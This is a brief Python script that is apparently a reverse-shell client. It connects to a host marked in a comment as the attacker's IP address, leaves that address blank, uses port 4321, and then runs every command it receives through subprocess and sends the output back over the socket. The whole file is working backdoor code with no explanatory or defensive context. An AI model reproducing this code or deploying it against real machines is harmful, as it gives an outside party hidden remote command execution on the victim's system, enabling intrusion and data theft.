import socket
import subprocess

HOST = " " # ip address of attacker
PORT = 4321
BUFFER_SIZE = 1024

s = socket.socket()
s.connect((HOST, PORT))

message = s.recv(BUFFER_SIZE).decode()
print("Server:", message)

while True:

    command = s.recv(BUFFER_SIZE).decode()

    if command.lower() == "exit":
        break

    output = subprocess.getoutput(command)
    s.send(output.encode())

s.close()
